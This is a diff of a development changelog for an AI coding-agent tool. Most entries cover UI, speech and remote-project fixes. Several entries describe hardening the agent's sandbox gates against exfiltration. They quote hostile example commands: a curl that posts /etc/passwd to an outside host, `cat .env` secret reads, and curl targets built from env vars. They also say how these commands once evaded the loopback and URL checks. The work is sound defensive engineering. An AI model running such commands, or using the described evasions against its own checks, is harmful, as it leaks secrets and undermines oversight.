@@ -1,5 +1,466 @@
 # Changelog
 
+## 2026-09-29 - PDF tuning directives are now model-gated only, not repo-gated
+
+Asking "create a PDF" got none of the PDF corrections, because the gate that
+supplies them looked for a file that did not exist yet.
+
+- **The pdf corpus is now universal** (`internal/skill/loader.go`). `stackActive`
+  hardcoded `conduct`/`hallucination` as the corpora admitted on an exact model-id
+  match alone; that set is now a named `universalStacks` map with `pdf` in it.
+  Admission is still `modelMatchesTuned` AND a stack check, so a non-tuned model
+  gets nothing — only the filesystem half is gone. The digest is force-injected
+  into every session for the four models that have a pdf corpus (~1.7KB, against
+  the 2.2KB conduct digest that was already unconditional).
+- **Why the marker gate was the wrong signal.** `internal/stackdetect` detects
+  `pdf` by globbing `*.pdf` at the repo root and one/two levels down, which
+  answers "is there already a PDF here" — not "will this session touch one". So it
+  missed every case the corrections exist for: generating a PDF from scratch, a
+  PDF attached from outside the repo, one deeper than the glob limit, and the
+  session that first writes a PDF (the prompt context is built once and cached for
+  prefix stability before the request exists). In all of those the model got no
+  catalogue line and no digest, so it had no way to know the corrections were
+  available. `stackdetect` still reports `pdf`; only the skill gate ignores it.
+- **The `when_to_use` prose said the opposite of the runtime.** All four
+  `docs/okf/pdf/derived/*.SKILL.md` files told the model to load only "AND the
+  repository contains a PDF" — so a matching model would have seen the digest
+  injected while its own catalogue entry instructed it to stand down. Rewritten
+  to state the model-only gate and why. `docs/okf/pdf/meta.yaml` now reads
+  `detection: mode: universal`, matching the `hallucination/` corpus.
+- **Two tests asserted the contract being removed, and were re-pointed rather
+  than deleted.** `TestKaizenDigestBlock_pdfRepoOutsideCheckout` used "a PDF-free
+  root gets nothing" as its negative control; that control now lives on the model
+  gate (a non-tuned model still gets nothing) plus the positive create-from-scratch
+  case. `TestKaizenDigestBlock_officeRepos`'s `docx repo gets no pptx digest` case
+  listed `pdfGLM` as unwanted even though its name only claims pptx — that case now
+  positively wants the pdf digest and still forbids pptx, which remains marker-gated.
+  New `internal/skill/kaizen_pdf_universal_test.go` pins the behaviour, including a
+  `stackdetect` precondition assertion so the test cannot pass via a stray PDF.
+- **Not fixed: `docx` and `pptx`.** They are gated on the same marker proxies and
+  reproduce the identical create-from-scratch defect. Tracked in `TODO.md`.
+
+
+## 2026-09-29 — The bash tool tells the model to write curl/wget URLs literally; Pulse's header spinner is gone
+
+Two small changes to what the model and the dashboard are shown, both following
+from the sandbox exfiltration work in this batch.
+
+- **The bash tool's own description now carries the constraint**
+  (`internal/tool/exec.go`). The sandbox exfil gate can only prove a curl/wget
+  target is loopback when the URL and its flags are present **literally** in the
+  call: `curl -u user:pass http://127.0.0.1:8080/x` is verifiable, while
+  `curl "$BASE/x"`, `curl $A "$2"` and anything routed through a function
+  argument are not and always Ask. That was a rule the model could only learn by
+  being prompted, so it is now part of the tool's advertised contract, with the
+  literal example spelled out. A prompt-time note is not enough — the model
+  chooses the command shape before any permission prompt exists.
+- **The Pulse header no longer renders a `Loader2` spinner**
+  (`web/src/components/Pulse/PulseView.tsx`). Rows arrive from the initial
+  `GET /api/pulse` and then patch live, so the spinner flashed once on every
+  mount and then sat next to a `Refresh` button that already says when a
+  reload is happening. `usePulse`'s `loading` is no longer destructured and the
+  icon import is dropped. Purely presentational: no request, retry or ordering
+  behaviour changed.
+- **`claude-sonnet-5-5` joins the "Claude Code (Read-Only CLI)" advisor
+  section** in both pickers — `internal/tui/picker.go`
+  (`prependClaudeCodeSection`) and `web/src/components/Layout/modelSelection.ts`
+  (`CLAUDE_CODE_ADVISOR_MODELS`), which the doc
+  `docs/concepts/advisor-claude-code-backend.md` requires be kept in sync. The
+  section is hardcoded rather than model-list driven, so a new Claude Code
+  release has to be added in two places; the doc records the contract.
+
+## 2026-09-29 — Pulse is a top-level dashboard icon, not a hamburger menu item
+
+The cross-project Pulse dashboard was reachable in the web UI only through a
+hamburger `Menu` popover at the top-left of the project list — the hamburger sat
+*inside the project list* and its single item was "Dashboard". A view that spans
+every project was therefore two clicks deep and framed as though it belonged to
+one project, which is the opposite of what it is.
+
+- **It is now a `LayoutDashboard` icon button beside the `Projects` heading**, as
+  a sibling of the list rather than an action inside it. Same reasoning that
+  killed the original pinned session-tab pill applies to the hamburger: a
+  control positioned within the project list implies project scope. Header row
+  is `[Projects (flex-1)] [dashboard icon] [collapse chevron]` — the same three
+  slots the hamburger occupied, so the row's geometry is unchanged. The button
+  carries `aria-label="Open dashboard"` and a "Dashboard — all projects"
+  tooltip, since an icon with no visible text is otherwise unnamed. The
+  hamburger, the `role="menu"` popover and the now-unused `Menu` / `Popover*`
+  imports are gone.
+- **`renderExpandedInner()` now supplies its own `TooltipProvider`.** The new
+  icon is the first Radix `Tooltip` in that shared body, and *both* of its
+  callers — the mobile drawer branch and the desktop expanded column — rendered
+  it with no provider ancestor; only the collapsed rail brought its own. Radix
+  throws `Tooltip must be used within TooltipProvider`, so the provider sits
+  inside the shared function where both callers get it. Verified by mutation:
+  removing it turns the new mobile test red on that exact error.
+- Unchanged: the `onOpenDashboard` prop stays optional and its button is not
+  rendered when it is omitted, so a half-mounted tree never offers a dead
+  control. The other entry points — the `PulseBadge` in the top header,
+  Cmd/Ctrl+J, the desktop "Dashboard…" app menu, and the tray "Open Pulse"
+  item — are untouched.
+
+## 2026-09-29 — Chat stops bouncing its scroll position up after a turn
+
+The transcript viewport **jumped upward** every time a turn finished or a
+transcript finished rendering, on both the desktop app and the web UI. The view
+would ride the tail, then leap back up mid-stream and stop following.
+
+- **Virtual items were keyed by message-object identity.** The turn-boundary
+  `SET_MESSAGES` — dispatched by the `messages` SSE event — replaces the whole
+  `messages` array with freshly parsed objects and clears `live` in the same
+  reducer update (`MERGE_SNAPSHOT` does the same on initial load and from the
+  turn watchdog). Every message therefore got a brand new key at the end of
+  every turn. That emptied the virtualizer's
+  `itemSizeCache`, and since the list container's height *is*
+  `getTotalSize()`, it collapsed from real measured heights back to
+  `count × estimateSize`. The tail pin's `el.scrollTop = el.scrollHeight` was
+  then clamped against the shrunken container — a real upward jump. The key is
+  the global transcript position, so it also survives a capped window sliding
+  forward: trimming the head drops keys rather than moving surviving rows.
+  **`web/src/lib/chatItemKeys.ts`** (new) keys rows by global transcript
+  position (`windowStartServerIndex + originalIndex`), which is stable across
+  both that snapshot and prepend pagination. As a side effect a row's tool
+  output no longer silently re-expands on every background refresh.
+- **The live→committed swap still punched a hole**, so the height of the
+  non-virtualized `live` block is now captured with a `ResizeObserver` and used
+  to seed the estimates of the rows replacing it, distributed proportionally.
+  `scrollHeight` stays continuous across the swap; `measureElement` still
+  corrects each row a frame later.
+- **A clamped pin was misread as the reader scrolling up.** `el.scrollTop =
+  el.scrollHeight` is clamped by the browser whenever the content is shorter
+  than the requested offset, so the offset can move *down* without any user
+  input. Both the synchronous and the deferred at-bottom recomputes treated
+  that decrease as reader intent and silently dropped the tail follow, stranding
+  the transcript above the bottom. Unpinning now requires a real gesture (wheel,
+  touch, scrollbar drag, or `ArrowUp`/`PageUp`/`Home`) within 250ms; re-arming
+  stays unconditional so the follow still resumes when the reader scrolls back.
+- **Stopped the competing writers.** `overflow-anchor: none` on the scroll
+  surface (native scroll anchoring has to guess with absolutely positioned
+  `translateY` rows), and virtual-core's own estimate→measure scroll
+  compensation is now disabled while the viewport is pinned, so it cannot pull
+  against the tail pin. It stays enabled for a reader who scrolled up, which is
+  the case it exists for.
+
+Tests: `web/src/lib/chatItemKeys.test.ts` (key stability across a snapshot and
+across prepends), a ChatPanel disclosure-persistence test that fails against the
+old keying, and a test that a gesture-free offset decrease does not unpin. Five
+existing scroll tests now dispatch the wheel gesture they were already
+describing in their comments — unpinning is intent-gated, and a bare offset
+decrease is exactly the false positive being fixed.
+
+## 2026-09-29 — Speak gets a queue, and the toolbar names what is playing
+
+Clicking Speak on a second message while the first was still being read
+**threw the first one away**. The funnel was newest-wins: each request bumped a
+generation counter and the older, still-unresolved request was discarded. Three
+messages, three clicks, one message spoken.
+
+- **`web/src/components/Speech/SpeechProvider.tsx`** — a real client-side FIFO
+  queue. `speak()` appends; a single-flight `drain()` loop plays one item at a
+  time and advances when an item's playback ends, fails, or is torn down. Stop
+  clears the queue (matching the documented "clears queue" contract); **Next**
+  abandons the current item and promotes the next; **Clear queue** drops the
+  backlog but lets the current item finish.
+- **Summarising moved into the worker.** The summariser resolves when an item
+  reaches the head of the queue, not when it is enqueued, so a five-message
+  burst costs one in-flight 60s model call instead of five racing to land out of
+  order. `resolveSpeechText` now takes its gate as an argument rather than
+  reading the closure.
+- **`speakNow` → `playItem`**, which returns a promise that settles on the
+  natural end of the clip rather than when `audio.play()` resolves (that promise
+  settles when playback *starts*). Browser Native settles from the last chunk's
+  `onend`; a failed chunk or synthesis settles too, so one bad item cannot
+  strand everything behind it.
+- **`stop()` was split.** `haltCurrent()` stops just the current playback
+  without touching the queue — `playItem` needs that, because the full `stop()`
+  bumps the run counter and would make the drain loop abandon the item it had
+  just dequeued.
+- **Each item snapshots its context**: the project title, the chat session
+  title, the session id, the host and the speak-mode gate, all as of the click.
+  A queue outlives a tab switch, so reading those from live props would
+  summarise a queued message against the wrong conversation and label it with
+  the wrong project.
+- **`web/src/components/Speech/SpeechToolbar.tsx`** — a `project · session`
+  now-playing label (truncated, full value in the tooltip), a `+N queued` badge
+  counting only the items still *waiting*, and the Next / Clear queue controls.
+  `speechItemLabel` is exported so the rendered text and the tooltip cannot
+  disagree, and skips whichever half is unknown rather than printing a dangling
+  separator.
+- **`web/src/App.tsx`** — the existing `SpeechProviderInsideProject` bridge
+  passes `projectTitle`/`sessionTitle` down as props. It reads the project store
+  because the provider itself is rendered bare in its own tests and must not
+  reach for a `ProjectProvider` it is not inside.
+- **One existing test was replaced, deliberately.**
+  `SpeechProvider.speechSummary.test.tsx` pinned "plays only the newest message
+  when two summaries resolve out of order" — newest-wins *is* the behaviour the
+  queue removes, so the test now pins "plays BOTH messages in click order". The
+  out-of-order half of the old guarantee is no longer defended by a guard but by
+  construction: only the head item summarises, so a second click cannot have a
+  summary in flight to land late.
+- Tests: `SpeechProvider.queue.test.tsx` (15) and `SpeechToolbar.queue.test.tsx`
+  (10), all mutation-verified. Three mutations were caught and one turned out to
+  be an equivalent mutant: capturing `queueRun` once instead of per item
+  deadlocked `Next` (the loop exited on its own stale snapshot while the latch
+  it held on the way out blocked the restart), and the label tests initially
+  missed the stale-closure case because they enqueued while `drain`'s memoised
+  closure was still fresh. The surviving one exposed a real redundancy —
+  `next()`'s `void drain()` could never run, because the single-flight latch is
+  still held by the very loop that advances the item — so that call was deleted
+  and the comment now names the real mechanism.
+- The TTS design spec's §7 first bullet ("New selection/text immediately
+  replaces current playback and clears queue") documented the old contract and
+  is amended, along with §8, the frontend state notes, the contradiction
+  self-review and the frontend test list.
+
+## 2026-09-29 — `ocode remote` no longer persists a project for a host it never reached
+
+`internal/remotecli/remotecli.go` called `store.AddRemote` unconditionally once
+the connect returned, so a failed connect left a permanent dead entry in the
+project list. This is how a `nosuchhost.invalid` row appeared in a real
+developer's `~/.local/share/opencode/projects.json` — it was never added by
+hand, it was written by `TestRunAllowsWebFlagWithoutExplicitPath` in this
+package, which had no data-dir isolation and dialled the RFC 2606 host for real.
+
+- **Establishment boundary** — `remote.ConnectOptions` gains `OnEstablished`,
+  called by both `Connect` and `ConnectWeb` immediately after the shared
+  prepare stages (reachability, platform detect, ensure-binary, credential
+  sync) succeed and before any launch/tunnel/browser stage. That is the line
+  between "this host is real" and "something later went wrong": a deliberate
+  Ctrl-C disconnect, a dropped tunnel or a remote server that refuses to start
+  all still leave a project worth reattaching to, so those must keep persisting.
+- **Persistence gate** — the post-connect write now requires
+  `shouldPersistRemote(hostKey, established)`: the host must have been confirmed
+  usable AND the host key must be non-blank. A typo'd or offline host no longer
+  becomes a permanent entry.
+- **Pre-write rollback** — `--web` + SSH writes the entry BEFORE connecting
+  (the `PortMapHook` keys off it). That write is now rolled back when the host
+  never establishes, but only when this call actually created the entry, so a
+  failed connect can never delete a project the user already had.
+- **Test isolation** — `newStore`/`connect`/`connectWeb` function-var seams (the
+  convention already used by `gitStatusFn` and `prepareLocalBuildFn`) let the
+  whole persistence path run against a temp-dir store with a stubbed connect.
+  `TestRunAllowsWebFlagWithoutExplicitPath` is now hermetic; running this
+  package's suite leaves the real `projects.json` byte-identical.
+
+Seven mutants, all caught: persisting without establishment, dropping the
+rollback, rolling back a pre-existing entry, ignoring a blank host key, firing
+the hook before the prepare chain, firing it mid-chain, and deleting the
+`ConnectWeb` call site. Two of those first surfaced real gaps — the
+"pre-existing entry" test was written against the non-web path, which never
+enters the rollback branch, and no test asserted the hook *fires*, so deleting
+both call sites was invisible.
+
+## 2026-09-29 — Review fixes: redaction on side clients, host-on-tab, port-map teardown
+
+Follow-up to a broad review of the `dd431b4a` batch. Five defects fixed, each
+with a mutation-verified regression test.
+
+- **Redaction on side-task LLM clients** (`internal/agent/agent.go`) — a new
+  `bindSideClient` chokepoint applies `attachRedactionHook` to every freshly
+  built side client (compaction, speech summary, recap, title, advisor,
+  auto-continue, doc/memory maintenance, task contract), not just the main
+  client. `NewClient` cannot know the hook, so with redaction enabled those
+  clients shipped the transcript UNREDACTED to the side model. The
+  auto-permission judge keeps its registry-gated mask hook deliberately (it
+  needs a registry to unmask with).
+- **Host-on-tab** (`web/src/stores/projectStore.tsx`, `hooks/useSessionHost.ts`)
+  — `Tab` now records the host it was opened against and `resolveSessionHost`
+  prefers it over path inference. "Duplicate as remote" deliberately gives a
+  path two owners, and path-only inference rejected the ambiguity and routed
+  remote chats/terminals to the LOCAL server.
+- **Pulse** (`web/src/stores/pulseStore.tsx`) — a known session's unhandled SSE
+  frame (`text`/`thinking`/`tool_output`/`turn_heartbeat`) no longer arms the
+  unknown-session refetch (was a ~3/s `GET /api/pulse` poll during a turn), and
+  `sortPulseRows` compares parsed instants, so a `+08:00` server stamp and a `Z`
+  live stamp order correctly.
+- **Port maps** (`internal/server/handler_portmaps.go`, `internal/remote/portmap.go`)
+  — DELETE checks the store knows the port before tearing the forward down (a
+  failed removal no longer suppresses it forever), and forward registration IDs
+  include the target so two projects forwarding the same remote port no longer
+  collide on the shared process supervisor.
+- **Compact config** (`internal/server/handler_config.go`) — `h.mu` is released
+  across the cross-process config save (it was held, stalling the whole server
+  behind one PUT).
+
+Deferred, logged in `TODO.md`: the `pipesIntoInterpreter` wrapper evasions, the
+`SpeechProvider` unmount invalidation, and redaction on the permission
+interpreter client — all in files under concurrent edit when this landed.
+
+## 2026-09-29 — Speak reads a summary: a summary model, a sidebar row, and a Summarised/Full Text switch
+
+Clicking Speak used to hand the raw assistant message to the TTS engine, so a
+code-heavy answer was dictated punctuation by punctuation. Speak now runs the
+message through a small language model first and reads that instead — prose,
+with code summarised in words. The gate is on by default, the model is
+selectable, and the old behaviour is one click away.
+
+- **Config** (`internal/config/ocodeconfig.go`) — `Ocode.SpeechSummaryModel`
+  (`speech_summary_model`) and `Ocode.SpeechSummaryEnabled`
+  (`speech_summary_enabled`, default **true**). Both are presence-guarded on
+  load (`raw["speech_summary_enabled"]`), deliberately *not* nested under the
+  `context_model` guard, so an absent key yields the default and an explicit
+  `false` still wins.
+- **Summariser** (`internal/agent/speech_summary.go`) — `speechSummaryClient()`
+  resolves speech-summary model → small model → main model and never enables
+  thinking; `SummarizeForSpeech(text) string` returns `""` on any failure,
+  which the web layer already reads as "speak the original". Results are cached
+  by sha256 of the input under `<tmp>/ocode-speech-summaries` with a prune pass.
+  `compactSummaryClient` was split into `smallModelOrMainClient` +
+  `overrideModelClient` so both the compaction and speech paths compose the
+  same way. `cleanSpeechSummary` strips markdown labels via a conservative
+  `isSpeechPreamble` check — a looser label heuristic ate legitimate prose
+  ("It works: because…").
+- **Endpoints** (`internal/server/handler_speech_summary.go`, routes
+  `server.go:336,384-385`) — `POST /api/sessions/{id}/speech-summary` and
+  `GET`/`PUT /api/config/ocode/speech-summary`. The **PUT is partial**: it
+  accepts pointer fields and writes only what was sent, so the enabled gate and
+  the model picker can never clobber each other. A client read-modify-write
+  must not be reintroduced on top of it.
+- **UI** — `SpeechProvider` owns both controls (`summaryEnabled`,
+  `summaryModel`, `setSummaryEnabled`, `setSummaryModel`; the gate is
+  optimistic and reconciled from the server's merged block) and
+  `resolveSpeechText` summarises first, falling back to full text.
+  `SpeechToolbar` gets a two-state **Summarised / Full Text** toggle persisted
+  in `speechToolbarPersistence`. `CoworkSidebar` gains a summary-model row and
+  `ModelDialog` a `purpose="speechsummary"` variant ("Select Speech Summary
+  Model"). `TTSForm` (Settings → Speech) exposes the model row + "Change…" and
+  the enabled checkbox. Every new api method is host-threaded; `SpeechProvider`
+  takes `sessionId`/`host` as props.
+- **A second wave of mock breakage from an unrelated concurrent change.**
+  `resolveSessionHost` (`web/src/hooks/useSessionHost.ts`) now imports `findTabForSession`
+  **directly** from the store module rather than reaching it through a mocked hook, so every
+  test that `vi.mock`s `projectStore` without that export throws
+  `No "findTabForSession" export is defined` the moment any code path resolves a host — 22 files
+  across `Chat/`, `Layout/`, `Assets/`, `Terminal/` and `common/`, not just the sidebar. The stub
+  was added to all of them. Same class as the api-mock lesson above but worth separating: this
+  one is a *direct import inside a real (unmocked) module*, so mocking the module's public
+  surface short-circuits the dependency entirely.
+- **The mutation harness itself was lying, and now cannot.** `web/mutate_speech.sh` mutates
+  `SpeechProvider.tsx` by exact-string anchor. When `resolveSpeechText` was refactored to take
+  an explicit `gate` object, four anchors stopped matching; the python `assert` fired, but the
+  shell function swallowed the failure and each one printed
+  `SURVIVED … <-- test gap` — four **phantom** test gaps that buried the real signal (and
+  pointed the next person at tests that were fine). The harness now separates the two outcomes:
+  a non-applying anchor reports `ANCHOR-FAILED … HARNESS ROT` and is counted, with a summary line
+  at the end so a rot-affected run cannot be read as clean. The four anchors were then re-issued
+  against the new signature and all four are caught again.
+- **Two real bugs found on the way.** (1) The config load block was first
+  written *inside* the `context_model` guard, so the default-on behaviour
+  vanished whenever that key was absent — caught by writing the default-ON test
+  before the change. (2) `App()` called `useProjectState()` at its own top
+  level while rendering `<ProjectProvider>` further down, which threw
+  `useProjectState must be used within ProjectProvider` and took 44 `src/App.*`
+  tests with it; fixed with a `SpeechProviderInsideProject` bridge component
+  rendered *inside* the provider.
+- **Settings → Speech field** (`TTSForm.tsx`, `TTSForm.speechSummary.test.tsx`) — the model
+  row + "Change…" (opening `ModelDialog purpose="speechsummary"`) and the
+  "Summarise before speaking" checkbox. The form is deliberately a **dumb surface**: a
+  pick calls `setSummaryModel(model)` and the checkbox `setSummaryEnabled(next)`, both owned by
+  `SpeechProvider`. `setSummaryModel` was added to the context for this and, like its sibling,
+  writes the model **only** and is reconciled from the server's merged block. The form does NOT
+  call `api.setSpeechSummaryConfig` itself — that would leave the toolbar and sidebar showing a
+  stale model, which is the state-duplication bug gotcha #50 warns about.
+- **Test hygiene.** A missing `api` mock method inside a `Promise.all` array
+  literal throws *synchronously* and kills the whole effect, so eight
+  `CoworkSidebar*.test.tsx` files needed `getSpeechSummaryConfig` added (28
+  failures) — anchor new mocks on a line that is unique in every file. The
+  `Settings` test also needed a **stable `dispatchSpy`** in `vi.hoisted`, because
+  `useChatDispatch` is a `ModelDialog` open-effect dependency and a fresh `vi.fn()`
+  per render loops the effect forever.
+- **Two mutations initially survived** the Settings test, and both were test defects rather than
+  code defects — the same pattern as the compaction work earlier. (1) A pick that *also* fired
+  `setSummaryEnabled(true)` passed, because the test only asserted the **arity** of the
+  `setSummaryModel` call; the extra write came from a separate call. It now also asserts
+  `setSummaryEnabled` was never called on the pick path. (2) Renaming the gate's `aria-label`
+  passed, because the wrapping `<label>` supplies the accessible name — so that mutation was
+  cosmetic, and the test was strengthened against the behavioural version (removing `onChange`).
+  Both are now caught.
+- Validation: 14 Go tests across the three packages, all 14 Go mutations caught, plus 4
+  mutations on the Settings field (2 of which exposed weak assertions, since fixed) and the
+  7-mutation `web/mutate_speech.sh` harness; web `tsgo --noEmit`, `vite build` and the full
+  300-file / 2599-test suite green (after the store-mock repair above);
+  `go build ./...`, `go vet`, `gofmt` clean. The
+  `internal/agent` full-suite flake in the task-tool concurrency tests
+  (`TestTaskToolBackgroundRunQueuesBeyondMaxConcurrent`,
+  `TestNestedSyncTaskDispatchDoesNotDeadlockUnderMaxConcurrentAgentsOne`) was reproduced on the
+  pristine baseline worktree, which contains none of this code — pre-existing, not this change.
+
+## 2026-09-29 — `DB="$(…)"` no longer asks as `bash.prefix.$(…)`; sandbox `cat .env` asks again
+
+- **Assignment from a command substitution** (`internal/agent/permissions.go`). The tokenizer splits a
+  word at `$(…)`/backticks, so `DB="$(grep -E "^DATABASE_URL=" .env | cut -d= -f2-)"` parsed as the
+  assignment `DB=` plus a *command* whose binary was the substitution — an Ask with the nonsense rule
+  `bash.prefix.$(grep …)` (and `sandbox.opaque_command` in sandbox). Tokens now carry `glued` (no
+  whitespace before them); `parseSingleCommandTokens` folds glued substitutions/words into the
+  assignment value. The substitution's inner commands are still their own fragments, and
+  `X= $(cmd) …` (space after `=`) still yields an opaque command head.
+- **Bare dotfiles are paths** (`isLikelyPathArg`). It required a dot *after* the first character, so
+  `.env`/`.netrc`/`.npmrc` were not path args: in sandbox, `cat .env` and `grep … .env` auto-allowed
+  while `cat ./.env` asked. Leading-dot names now count as paths.
+- Tests: `internal/agent/permissions_assign_subst_test.go`.
+
+## 2026-09-29 — Speech no longer spends an LLM call to shorten a short message
+
+Clicking Speak on a short, already-spoken-friendly reply ("Done — the retry limit
+is now three.") waited on a full speech-summary model round trip before a single
+word was read. The summariser's own prompt already tells the model to return such
+a message "almost unchanged", so the call bought no rewrite.
+
+- **`internal/agent/speech_summary.go`** — `SummarizeForSpeech` now returns `""`
+  (the existing "speak the original text" signal, and what the web layer already
+  does) without calling the model when the message is short plain prose. New
+  `speechSummarySkipChars = 400` (~20s of speech at 160 wpm). The gate runs
+  before the client is resolved and before the 24h cache is read, and logs one
+  `SPEECH` debug line.
+- **Length is only half the test.** A short message can still be a code block, a
+  diff, a path, a URL, a table or a crash trace — reading those aloud verbatim is
+  the exact failure the summariser exists to prevent — so
+  `speechTextHasSpeakableArtifact` scans for them: a backtick, `http(s)://`, a
+  `@@` hunk header, crash markers, a `+`/`-` marker with no space after it
+  (markdown bullets require the space, so this is a diff, not a list), a `$ `
+  prompt, two or more pipes, and any path- or filename-shaped token. The scan
+  errs towards firing: a wasted round trip is cheaper than dictating source.
+- **No client change, no new config key, no new endpoint.** An empty summary was
+  already a supported 200 response.
+- Two limits are documented rather than hidden: a table that arrived as *rendered*
+  text has no pipes left to detect, and a bare version or abbreviation ("e.g",
+  "1.2.3") is deliberately not treated as a filename.
+- Tests: `TestSummarizeForSpeechSkipsTheLLMForShortPlainProse`,
+  `TestSummarizeForSpeechStillSummarisesShortTextCarryingArtifacts` (12 artifact
+  shapes), `TestSpeechTextNeedsRewrite` (both directions, including the
+  false-positive cases), plus `TestSpeechSummaryBodyStillReachesTheModel` — a
+  guard on the shared long-prose fixture, so the seven pre-existing tests that
+  now speak through it cannot silently pass on the short-circuit instead. All
+  seven mutations of the gate and its rules are caught (gate removed, length
+  rule removed, artifact rule removed, and the backtick / diff-line /
+  line:col-split / bare-filename rules removed one at a time).
+
+## 2026-09-29 — Sandbox curl asks no longer blame git; two loopback/env-var exfil gaps closed
+
+A sandbox Ask for a curl/wget/nc exfiltration-risk command (e.g. `curl -s $A … "$2"` — URL and
+flags behind variables, so loopback can't be proven) showed the rule
+`bash.prefix.sandbox.harmful_git`, for a command with no git in it. `IsHarmfulBashCommand` covers
+both families and the sandbox gate labelled every hit as git.
+
+- **`internal/agent/permissions.go`** — new `isExfiltrationRiskBash` (wrapper-peeled, like
+  `IsHarmfulBashCommand`) runs first in both sandbox branches and Asks with
+  `sandbox.exfiltration_risk`. Relabel only: the git gate still runs after, so nothing new allows.
+- **`internal/tool/exec.go`** — bash tool description tells the model to write curl/wget URLs and
+  flags literally; variable/function-arg URLs always prompt.
+- **Loopback carve-out now needs *every* target to be loopback** (`subprocessTargetsLocalhost`,
+  `internal/agent/permission_interpreter.go`). One loopback token used to exempt the whole command,
+  so `curl -e http://localhost -d @/etc/passwd https://example.com` skipped the exfil gate *and* hit
+  the loopback auto-allow (`isLoopbackNetworkCommand`). Any other URL (flag values included), a
+  whole-word `$`/backtick expansion that could itself be the target (`$URL`, `"$2"`), or a
+  scheme-less dotted host now voids the exemption. Env vars as *data* to loopback stay exempt
+  (`-H "Authorization: $TOKEN"`, `?k=$KEY` in a loopback URL, values of `-u`/`-d`/`-o`/…).
+- **curl env-var check covers every arg** (`isExfiltrationRiskCurl`). The URL-position loop skipped a
+  `://` arg after any flag, so `curl -s "https://example.com/?k=$HOME"` and `curl -o f $URL` passed.
+  Now any env ref Asks, matching wget.
+- Tests: `internal/agent/permissions_sandbox_exfil_label_test.go`,
+  `internal/agent/permissions_exfil_gaps_test.go`.
+
 ## 2026-09-29 — The server test binary is now hermetic against exported provider keys
 
 `TestReconcileProfileAgentAppliesProfileCredential` and
@@ -474,12 +935,17 @@ where a global view belongs (a per-project row would wrongly imply the dashboard
   opening a tab bound to no project. `activeView` is local `useState` in `App.tsx` and this app has
   no client router, so the "leave the dashboard" transition is supplied by a small
   `PulseJumpProvider` instead of the helper reaching into view state.
-- **Not verified: the performance budget.** The design specified p50 < 200 ms for `scope=live` and a
-  one-off `curl -w '%{time_total}'` of `scope=all` against a populated multi-project store. Neither
-  was measured — no such environment was available — so **no timing is claimed here**. The two
-  changes that exist to keep `live` cheap (a single indexed title row per session instead of a
-  per-request directory scan; no todo reads on the disk path) are in place and are covered by
-  correctness tests, not by timings. Recorded as outstanding in the plan's INDEX banner.
+- **Measured, with the caveat stated.** Built binary on a real multi-project store (9 projects,
+  100+ sessions returned across 2 pages) via `curl -w '%{time_total}'`:
+  `scope=live` = **0.6 ms** (an *empty* live registry, so this is a floor and NOT evidence for the
+  p50 < 200 ms budget under load); `scope=all` = **0.92 s cold, ~0.58 s warm** over five calls, with
+  one 6.5 s first-call outlier observed on a process that had just absorbed a rate-limiter burst.
+  The design's "stop and report if `all` exceeds 1 s" gate is therefore met on repeat calls and
+  marginal on a genuinely cold process — reported rather than optimised, per the plan. The two
+  changes that keep `live` cheap (a single indexed title row per session instead of a per-request
+  directory scan; no todo reads on the disk path) are in place. A `BenchmarkHandlePulseLive` with
+  ~50 live entries — the plan's other ask — is still **not** written, so the p50 claim remains
+  unverified.
 - **Entry points** — main menu top-left of the project list; a header badge `● running · ◆ needs you`
   that renders **nothing** at zero (a permanent `0 · 0` trains the user to ignore the one surface
   whose job is "something needs you"); and **Cmd/Ctrl+J** to toggle, with the same xterm guard as the
@@ -4750,7 +5216,7 @@ Two follow-ups to the session-switch work.
 
 - **Remote web session routing (2026-09-17)** — open tabs register their remote hosts with the event bus; session model selection, command context, and agent-run seed requests follow the session host. Agent-run caches are host-scoped, unresolved project snapshots defer seed requests, and clearing the active project clears the event bus's active host. Regression coverage includes host inventory, model-dialog routing, command context, project-store state, and agent-run loading.
 - **Version workflow** — added `make up-patch` and `make up-minor` to update the canonical version and changelog entry, then install the CLI and build the macOS desktop app with the new version.
-- **Version Bump** — 0.8.112 → 0.8.113
+- **Version Bump** — 0.8.112 → 0.8.116
 - **Web/Desktop: Computer Use settings group** (`web/src/components/Settings/`) — new `ComputerUseForm.tsx` (enable checkbox + Save, loads `GET /api/config/computer-use`, saves `PUT /api/config/computer-use`) registered as its own `computer-use` nav entry in `SettingsPanel.tsx` (`OCODE_GROUPS` after OCR + `renderGroup` case). Renders the shared `computer.StatusLines` block, so the panel shows the platform backend and the macOS permission reminder without probing the desktop. Regression suite: `ComputerUseForm.test.tsx` (nav registration verified to fail without the `OCODE_GROUPS` entry). `docs/computer-use.md` updated to document the panel as the third toggle surface.
 - **Agent: remove state reflection feature** (`internal/agent/`) — deleted `state_reflect.go`, `state_reflect_test.go`, `agent_state_reflect_methods.go` and the `reflectState` field / `reflectTail` call from `agent.go`; the reflection hook that appended user messages on preview/browser snapshot changes is removed entirely
 - **LSP diagnostics: fingerprint only emitted diagnostics** (`internal/agent/lsp_inject.go`) — `injectLSPDelta` now records `a.lspSeen[uri]` after the line-cap check and rendering, so diagnostics that were skipped or never delivered are not permanently marked as reported
